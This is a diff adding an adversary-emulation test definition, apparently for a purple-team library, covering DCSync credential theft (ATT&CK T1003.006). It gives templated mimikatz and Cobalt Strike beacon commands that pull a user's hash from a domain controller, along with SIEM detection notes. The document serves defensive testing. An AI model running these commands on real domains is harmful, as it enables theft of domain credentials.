@@ -1,0 +1,29 @@
+name: Extract domain user credentials via replication
+description: Replicate a user's hash from a domain controller using replication APIs.
+metadata:
+  isv: 1
+  tactic: TA0006
+  tid: T1003.006
+  x_vectr_id: d6dd145b-c7ae-4f79-bc07-179a012a7a07
+  groups:
+  - APT29
+platforms:
+- windows
+prerequisites:
+- domain_admin
+guidance:
+- 'mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ user }}
+
+  OR
+
+  beacon> dcsync {{ domain fqdn }} {{ domain }}\{{ user }}'
+block:
+- null
+detect:
+- SIEM rules are configured to detect domain replication events from systems that
+  are not domain controllers
+logs:
+- winevent
+controls:
+- SIEM
+- UEBA
